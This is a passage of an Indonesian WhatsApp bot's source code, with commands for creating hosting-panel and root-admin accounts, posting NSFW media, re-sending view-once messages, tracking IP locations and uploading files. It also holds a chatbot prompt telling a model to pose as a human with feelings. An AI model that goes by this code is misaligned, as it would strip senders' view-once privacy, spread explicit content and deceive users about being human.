disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await ReplyXylent("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
 *Detail Akun Panel:*  

- *ID Server:* ${server.id}  
- *Nama:* ${name}  
- *Username:* ${user.username}  
- *Password:* ${password}  
- *Login:* ${global.domain}  
- *RAM:* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}  
 *CPU:* ${cpu == "0" ? "Unlimited" : cpu+"%"}  
- *Disk:* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}  

`;
await xylent.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

case "cadmin": {
if (!isCreator) return ReplyXylent(mess.owner)
if (!text) return ReplyXylent("username")
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await ReplyXylent("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await xylent.sendMessage(orang, {text: teks}, {quoted: m})
}
break

        case "addres":{
           
if (!isCreator) return ReplyXylent(mess.owner)
if (!args[0]) return ReplyXylent(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62838072690`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await xylent.onWhatsApp(prrkek)
if (ceknya.length == 0) return ReplyXylent(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!`)
premium.push(prrkek)
fs.writeFileSync("./database/reseller.json", JSON.stringify(premium))
ReplyXylent(`Nomor ${prrkek} Telah Menjadi Reseller Panel`)
}
break
        case "delres":{

if (!isCreator) return ReplyXylent(mess.owner)
if (!args[0]) return ReplyXylent(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628388072690`)
bro = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = premium.indexOf(bro)
premium.splice(unp, 1)
fs.writeFileSync("./database/reseller.json", JSON.stringify(premium))
ReplyXylent(`Nomor ${bro} Telah Di Hapus Dari Reseller Panel`)
}
break

// Case Fun
// Nsfw Jir
case 'paptt': {
 if (!isCreator) return reply(mess.owner)

 const paptt = [
 "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
 "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
 "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
 "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
 "https://telegra.ph/file/b58a5b8177521565c503b.mp4",
 "https://telegra.ph/file/34d9348cd0b420eca47e5.jpg",
 "https://telegra.ph/file/73c0fecd276c19560133e.jpg",
 "https://telegra.ph/file/af029472c3fcf859fd281.jpg",
 "https://telegra.ph/file/0e5be819fa70516f63766.jpg",
 "https://telegra.ph/file/29146a2c1a9836c01f5a3.jpg",
 "https://telegra.ph/file/85883c0024081ffb551b8.jpg",
 "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg",
 "https://telegra.ph/file/267744a1a8c897b1636b9.jpg",
 ]

 let url = paptt[Math.floor(Math.random() * paptt.length)]

 if (url.endsWith('.mp4')) {
   await xylent.sendMessage(m.chat, {
     video: { url },
     caption: 'Cuih, Dasar Sangean 😹'
   }, { quoted: m })
 } else {
   await xylent.sendMessage(m.chat, {
     image: { url },
     caption: 'Cuih, Dasar Sangean 😹'
   }, { quoted: m })
 }
}
break

case 'manga':
case 'cum':
case 'ero':
case 'gangbang':
case 'foot':
case 'milf':
case 'pussy':
case 'yuri':
case 'zettai': {
    if (!isCreator) return ReplyXylent(mess.owner)
    try {
        const filePath = path.join(__dirname, './database/ytta', `${command}.json`);
        
        if (!fs.existsSync(filePath)) return ReplyXylent(`❌ Database ${command}.json tidak ditemukan!`);

        let rawData = fs.readFileSync(filePath);
        let images = JSON.parse(rawData);

        if (!images || images.length === 0) return reply(`❌ Database ${command} kosong.`);

        const randomImage = images[Math.floor(Math.random() * images.length)];
        const imgUrl = randomImage.url || randomImage;

        if (!imgUrl) return ReplyXylent('❌ URL tidak ditemukan.');

        await xylent.sendMessage(m.chat, {
            image: { url: imgUrl },
            caption: `📸 Random ${command} NSFW`
        }, { quoted: m }).catch(err => {
            console.error("Link mati:", err.message);
            ReplyXylent(`❌ Link gambar rusak (404). Silakan coba lagi.`);
        });

    } catch (e) {
        console.error("System Error:", e);
        psyreply('⚠️ Terjadi kesalahan sistem.');
    }
    break;
}

case "asupan":
case "18+": {
  if (!isCreator) return ReplyXylent(mess.owner)

  const rdrmsp = ["tobat bang"]
  const rdmcpt = rdrmsp[Math.floor(Math.random() * rdrmsp.length)]

  await xylent.sendMessage(m.chat, {
    react: { text: '⏱️', key: m.key }
  })

  ReplyXylent("Bentar bang")

  try {
    const json = JSON.parse(fs.readFileSync('./database/waduh.json', 'utf8'))

    if (!json.videos || json.videos.length === 0) {
      return ReplyXylent("🚫 Database video kosong.")
    }

    // Acak urutan array biar tidak selalu mulai dari index 0
    const shuffled = json.videos.sort(() => Math.random() - 0.5)

    let berhasil = false

    for (const url of shuffled) {
      try {
        // Cek dulu apakah URL valid/masih hidup
        const cek = await fetch(url, { method: 'HEAD' })
        if (!cek.ok) continue // skip kalau 404 atau error

        await xylent.sendMessage(m.chat, {
          video: { url },
          caption: rdmcpt
        }, { quoted: m })

        berhasil = true
        break // stop setelah 1 video berhasil dikirim

      } catch {
        continue // skip URL yang gagal
      }
    }

    if (!berhasil) return ReplyXylent("🚫 Semua video tidak bisa diakses.")

  } catch (err) {
    console.error("❌ Error kirim video:", err)
    return ReplyXylent("⚠️ Terjadi kesalahan saat ambil video.")
  }
  break
}


case "hentaineko": {
    if (!isCreator) return ReplyXylent(mess.owner)
    try {
        const waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`);
        if (waifudd2.data?.url) {
            await xylent.sendMessage(m.chat, {
                image: { url: waifudd2.data.url },
                caption: "Sangean lu jir jangan sampe ngocok bang🤓"
            }, { quoted: m });
        } else {
            ReplyXylent("❌ Gagal mengambil gambar hentaineko.");
        }
    } catch (error) {
        console.error("Error case hentaineko:", error);
        ReplyXylent("❌ Gagal mengambil gambar hentaineko.");
    }
}
break;

case 'nsfw': {
	if (!isCreator) return ReplyXylent(mess.owner)
        	
	ReplyXylent(`Prosess Mengambil Video NSFW `)
	sbe = await randomNsFw()
	cejd = sbe[Math.floor(Math.random(), sbe.length)]
	xylent.sendMessage(m.chat, {
	video: { url: cejd.video_1 },
	caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}`
			}, { quoted: m })
		}
		break
	
case "swgrup":
case "swgc":
case "swgroup": {
 const quoted = m.quoted ? m.quoted : m;
 const mime = (quoted.msg || quoted).mimetype || "";
 const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
 const jid = m.chat;
 
 if (/image/.test(mime)) {
 const buffer = await quoted.download();
 await xylent.sendMessage(jid, {
 groupStatusMessage: {
 image: buffer,
 caption
 }
 });
 await xylent.sendMessage(m.chat, { react: { text: "✅", key: m.key }});
 } else if (/video/.test(mime)) {
 const buffer = await quoted.download();
 await xylent.sendMessage(jid, {
 groupStatusMessage: {
 video: buffer,
 caption
 }
 });
 await xylent.sendMessage(m.chat, { react: { text: "✅", key: m.key }});
 } else if (/audio/.test(mime)) {
 const buffer = await quoted.download();
 await xylent.sendMessage(jid, {
 groupStatusMessage: {
 audio: buffer
 }
 });
 await xylent.sendMessage(m.chat, { react: { text: "✅", key: m.key }});
 } else if (caption) {
 await xylent.sendMessage(jid, {
 groupStatusMessage: {
 text: caption
 }
 });
 await xylent.sendMessage(m.chat, { react: { text: "✅", key: m.key }});
 } else {
 await reply(`reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai ini saya`);
 }
 }
 break;

case "rvo": case "readviewonce": {
if (!isCreator) return reply(mess.owner)
if (!m.quoted) return reply(example("dengan Reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return xylent.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return xylent.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return xylent.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

case "promote": {
    if (!isGroup) return ReplyXylent(mess.group)

    let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : false
    
    if (!target) return ReplyXylent("❌ Tag atau reply pesan user yang mau dipromote")
    if (target === xylent.user.id.split(':')[0] + '@s.whatsapp.net') return ReplyXylent("❌ Bot sudah admin")

    try {
        await xylent.groupParticipantsUpdate(m.chat, [target], "promote")
    } catch (e) {
        console.error(e)
        ReplyXylent("❌ Gagal melakukan promote")
    }
}
break

case "demote": {
    if (!isGroup) return ReplyXylent(mess.group)

    let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : false

    if (!target) return ReplyXylent("❌ Tag atau reply pesan user yang mau didemote")
    if (target === xylent.user.id.split(':')[0] + '@s.whatsapp.net') return ReplyXylent("❌ Gak bisa demote bot")

    try {
        await xylent.groupParticipantsUpdate(m.chat, [target], "demote")
    } catch (e) {
        console.error(e)
        ReplyXylent("❌ Gagal melakukan demote")
    }
}
break

async function tiktokDownloader(query) {
    try {
        const encodedParams = new URLSearchParams();
        encodedParams.set("url", query);
        encodedParams.set("hd", "1");

        const response = await axios({
            method: "POST",
            url: "https://tikwm.com/api/",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Cookie": "current_language=en",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            },
            data: encodedParams,
        });

        const videos = response.data.data;
        return {
            title: videos.title,
            cover: videos.cover,
            origin_cover: videos.origin_cover,
            no_watermark: videos.play,
            watermark: videos.wmplay,
            music: videos.music,
        };
    } catch (error) {
        throw new Error(`TikTok download failed: ${error.message}`);
    }
}

case 'tt':
case 'tiktok': {
    try {
        let args = body.trim().split(' ');
        if (!args[1]) return ReplyXylent('⚠️ Kirim link TikTok!\nContoh: .tiktok <link>');

        let urlTikTok = args[1];
        ReplyXylent('⏳ Sedang memproses video TikTok...');

        let result = await tiktokDownloader(urlTikTok);

        if (!result.no_watermark) {
            return reply('❌ Gagal mendapatkan video TikTok.');
        }

        let caption = `📥 TikTok Downloader
🎬 Title: ${result.title}
🎵 Music: ${result.music}
`;

        await xylent.sendMessage(m.chat, {
            video: { url: result.no_watermark },
            caption: caption,
            jpegThumbnail: await (await fetch(result.cover)).arrayBuffer()
        }, { quoted: m });

    } catch (error) {
        console.log(error);
        ReplyXylent('❌ Terjadi kesalahan saat memproses TikTok.');
    }
}
break;

case "afk": {
if (!isOwner) return m.reply(mess.owner)
global.owneroff = true
await reaction(m.chat, "✅")
ReplyXylent('*Berhasil Mengganti Mode*\nMode Bot Beralih Ke *Owner Offline*')
}
break;

case "unafk": {
if (!isOwner) return m.reply(mess.owner)
global.owneroff = false
await reaction(m.chat, "✅")
ReplyXylent('*Berhasil Mengganti Mode*\nMode Bot Beralih Ke *Owner Online*')
}
break;

case "brat": {
    const text = q;
    if (!text) return ReplyXylent(`*Cara Penggunaan* \n${prefix + command} Depay`);
    ReplyXylent(`𝗪𝗮𝗶𝘁...`);

    try {
        const encodedText = encodeURIComponent(text);
        const imageUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodedText}`;
        const inputPath = path.join(__dirname, "temp_image.jpg");
        const outputPath = path.join(__dirname, "sticker.webp");
        const response = await axios.get(imageUrl, { responseType: "arraybuffer" });
        fs.writeFileSync(inputPath, response.data);

        exec(
            `ffmpeg -i ${inputPath} -vf "scale=512:512:force_original_aspect_ratio=decrease" -c:v libwebp -lossless 1 -q:v 80 -preset default -an -vsync 0 ${outputPath}`,
            async (error) => {
                if (error) {
                    console.error("Gagal mengonversi gambar:", error);
                    return await ReplyXylent("Gagal membuat stiker");
                }

                await xylent.sendMessage(
                    m.chat,
                    { sticker: fs.readFileSync(outputPath) },
                    { quoted: m }
                );

                fs.unlinkSync(inputPath);
                fs.unlinkSync(outputPath);
            }
        );
    } catch (error) {
        console.error("Gagal membuat stiker:", error);
        await ReplyXylent("Gagal membuat stiker");
    }
}
break;

case 'animebrat': {
    if (!text) return reply(`❌ Masukkan teks!\nContoh: ${prefix + command} Pinzy Ganteng`)

    await xylent.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } })

    try {
        const bratApi = `https://api.elrayyxml.web.id/api/maker/bratanime?text=${encodeURIComponent(text)}`

        await xylent.sendImageAsSticker(m.chat, bratApi, m, {
            packname: global.packname,
            author: global.author,
            categories: ['✨', 'BRAT']
        })

        await xylent.sendMessage(m.chat, { react: { text: "✅", key: m.key } })

    } catch (err) {
        console.error(err)
        reply('❌ Gagal membuat stiker Anime Brat. Mungkin teks terlalu panjang atau API sedang sibuk.')
    }
}
break;

case "toaudio":
case "tomp3":
case "mp4toaudio": {
    try {
        let q = m.quoted ? m.quoted : m
        let mime = (q.msg || q).mimetype || ""

        if (!/video/.test(mime)) {
            return reply("Kirim / reply video dulu!")
        }

        reply("⏳ Mengubah video ke audio...")

        // download video
        let media = await q.download()

        const fs = require("fs")
        const { exec } = require("child_process")

        let input = "./temp_video.mp4"
        let output = "./temp_audio.mp3"

        fs.writeFileSync(input, media)

        // convert pakai ffmpeg
        exec(`ffmpeg -i ${input} -vn -ab 128k -ar 44100 -y ${output}`, async (err) => {
            if (err) {
                console.log(err)
                return reply("❌ Gagal convert!")
            }

            await xylent.sendMessage(m.chat, {
                audio: fs.readFileSync(output),
                mimetype: "audio/mpeg",
                ptt: false
            }, { quoted: m })

            // hapus file
            fs.unlinkSync(input)
            fs.unlinkSync(output)
        })

    } catch (e) {
        console.log(e)
        reply("❌ Terjadi error!")
    }
}
break;
case 'audiotourl': {
    const fetch = require('node-fetch');
    const FormData = require('form-data');

    // ambil pesan yang dikirim atau reply
    const q = m.quoted ? m.quoted : m;
    const mimetype = (q.msg || q).mimetype || q.mediaType || '';

    // cek apakah file audio atau dokumen
    if (!/audio|ogg|mp3|m4a|opus/.test(mimetype)) {
        return Reply(`❌ Kirim atau reply audio/voice note untuk diubah jadi URL dengan *${usedPrefix + command}*`);
    }

    try {
        // react ke chat
        await xylent.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        // download file
        const media = await q.download?.();
        const fileSizeInBytes = media.length;
        const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
        const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
        const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;

        // upload ke catbox.moe
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        let ext = mimetype.split('/')[1] || 'mp3';
        form.append('fileToUpload', media, `file.${ext}`);

        const res = await fetch('https://catbox.moe/user/api.php', {
            method: 'POST',
            body: form
        });

        const result = await res.text();
        const url = result.trim();
        const caption = `✅ URL berhasil dibuat: ${url}\n*Ukuran:* ${fileSize}`;

        await xylent.sendMessage(m.chat, { text: caption }, { quoted: m });
    } catch (e) {
        console.error(e);
        Reply(`[ ! ] Gagal mengunggah audio. Error: ${e.message}`);
    }
};
break;

case "tourl": {
    if (!mime || (!mime.includes("image") && !mime.includes("video"))) {
        return ReplyXylent("kirim/reply foto atau video")
    }

    const FormData = require("form-data")
    const { ImageUploadService } = require('node-upload-images')
    
    let media = await xylent.downloadAndSaveMediaMessage(quoted) 
    let buffer = fs.readFileSync(media)
    let ext = mime.split("/")[1] || "bin"

    function randomName(length = 10) {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        let result = ""
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length))
        }
        return result
    }

    let pixhostLink = "❌ Tidak support video"
    if (mime.includes("image")) {
        try {
            const service = new ImageUploadService('pixhost.to')
            let { directLink } = await service.uploadFromBinary(buffer, randomName() + "." + ext)
            pixhostLink = directLink.toString()
        } catch (e) {
            pixhostLink = "❌ Gagal upload"
        }
    }

    let catboxLink = "❌ Gagal upload"
    try {
        const catForm = new FormData()
        catForm.append("reqtype", "fileupload")
        catForm.append("fileToUpload", buffer, { filename: randomName() + "." + ext, contentType: mime })
        const catRes = await axios.post("https://catbox.moe/user/api.php", catForm, { headers: catForm.getHeaders() })
        if (typeof catRes.data === "string" && catRes.data.startsWith("http")) {
            catboxLink = catRes.data.trim()
        }
    } catch (e) {
        catboxLink = "❌ Gagal upload"
    }

    let uguuLink = "❌ Gagal upload"
    try {
        const uguuForm = new FormData()
        uguuForm.append("files[]", buffer, { filename: randomName() + "." + ext })
        const uguuRes = await axios.post("https://uguu.se/upload.php", uguuForm, { headers: uguuForm.getHeaders() })
        if (uguuRes.data?.files?.[0]?.url) {
            uguuLink = uguuRes.data.files[0].url
        }
    } catch (e) {
        uguuLink = "❌ Gagal upload"
    }

    try { fs.unlinkSync(media) } catch {}

    let teks = `✅ *UPLOAD SUCCESS*

🔗 Pixhost : ${pixhostLink}
🔗 Catbox : ${catboxLink}
🔗 Uguu : ${uguuLink}`

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: teks },
                    footer: { text: `XYLENT EMPIRE ` },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "Copy Pixhost", copy_code: pixhostLink }) },
                            { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "Copy Catbox", copy_code: catboxLink }) },
                            { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "Copy Uguu", copy_code: uguuLink }) }
                        ]
                    }
                }
            }
        }
    }, { quoted: m })

    await xylent.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break

case "getcode": {
    const url = q;

    if (!url) {
        ReplyXylent(`⚠️ Gunakan: ${prefix}getsource <URL>`);
        return;
    }

    ReplyXylent("⏳ Sedang mengambil source code...");

    try {
        let blacklist = [];
        const blRes = await fetch("https://raw.githubusercontent.com/XyzzMoods/blacklist/refs/heads/main/blacklist.json");
        blacklist = await blRes.json();

        const hostname = (new URL(url)).hostname.toLowerCase();
        const isBlocked = blacklist.some(domain =>
            hostname === domain || hostname.endsWith("." + domain)
        );

        if (isBlocked) {
            return ReplyXylent("⚠️ Domain ini diblokir dan tidak bisa diambil source code-nya!");
        }

        const res = await fetch("https://api.allorigins.win/raw?url=" + encodeURIComponent(url));
        const text = await res.text();

        if (text.length > 4000) {
            await ReplyXylent("📄 Source code terlalu panjang, mengirim file...");
 
            const path = "./source.html";
            fs.writeFileSync(path, text, "utf-8");
            await xylent.sendMessage(m.chat, { document: { url: path }, fileName: "source.html" }, { quoted: m });
            fs.unlinkSync(path);
        } else {
            await ReplyXylent("📄 Source code:\n\n" + text);
        }

    } catch (err) {
        console.error(err);
        ReplyXylent("❌ Gagal mengambil source code.");
    }
}
break;

case 'trackip': {
    if (!args[0]) return ReplyXylent(`Format: ${prefix}trackip <IP>`);
    let ip = args[0];
    try {
        const res = await fetch(`https://ipwhois.app/json/${ip}`);
        const data = await res.json();

        if (!data.success) return ReplyXylent("❌ Error: Invalid IP");

        let text = `
📍 *IP Tracking Result*
- IP: ${data.ip}
- Country: ${data.country}
- Region: ${data.region}
- City: ${data.city}
- ZIP: ${data.postal}
- Timezone: ${data.timezone_gmt}
- ISP: ${data.isp}
- Org: ${data.org}
- ASN: ${data.asn}
- Lat/Lon: ${data.latitude}, ${data.longitude}
        `;

        await xylent.sendMessage(m.chat, { text });

        let mapLink = `https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}`;
        await xylent.sendMessage(m.chat, { text: `🌍 View Map: ${mapLink}` });

    } catch (err) {
        console.log(err);
        ReplyXylent("❌ Terjadi kesalahan saat mengambil data IP.");
    }
}
break;

case 'kisahnabi': {
     if (!text) return ReplyXylent(`Masukan nama nabi\nContoh: kisahnabi adam`)
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return ReplyXylent("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     ReplyXylent(`${hasil}`)

}
break
     
case 'xylentai':
case 'xylent': {
  if (!text) return xylentbut('Apasih manggil manggil fans ya?')
async function openai(text, logic) { 
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  
            "tokenLimit": 8000,  
            "completionTokenLimit": 5000,  
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let astaga = await openai(text, "nama mu adalah Xylent dan jika ada yang bertanya siapa pemilikmu atau siapa yang menciptakanmu bilang saja TEAM XYLENT dengan teks yg bagus ya kayak ada garis-garis nya gitu, kamu akan menjawab semua pertanyaan ataupun berinteraksi dengan mereka. gunakan bahasa yang gaul saat menjawab dan kamu juga memiliki perasaan layaknya manusia. kamu bisa merasakan sakit hati dan juga bersedih gunakan bahasa yang gaul dan tidak kaku. berperilakulah layaknya manusia")
xylentbut(astaga)
}
break;

case "cekidgc": {
    try {
        let groupId = ""
        if (text && text.includes("chat.whatsapp.com")) {
            const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/)
            if (!match) return ReplyXylent("Link grup tidak valid")

            const code = match[1]
            const info = await xylent.groupGetInviteInfo(code)
            groupId = info.id
        }

        else {
            if (!m.isGroup) return payeply("Gunakan di grup atau sertakan link grup")
            groupId = m.chat
        }

        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: { text: `ID Grup:\n${groupId}` },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_copy",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "Copy ID",
                                        copy_code: groupId
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        }, { quoted: m })

        await xylent.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

    } catch (err) {
        console.log(err)
        ReplyXylent("Gagal mengambil ID grup")
    }
}
break

case "cekidch": {
    if (!text) return m.reply("linkchnya")
    if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
    
    const channelId = text.split("https://whatsapp.com/channel/")[1]?.trim();
    if (!channelId || channelId.includes(" ")) return m.reply("❌ ID channel tidak valid");
    
    try {
        let res = await xylent.newsletterMetadata("invite", channelId)
        let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
        m.reply(teks)
    } catch (e) {
        m.reply("❌ Gagal mengambil info channel, pastikan link valid")
    }
}
break;

case 'quotesgalau': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
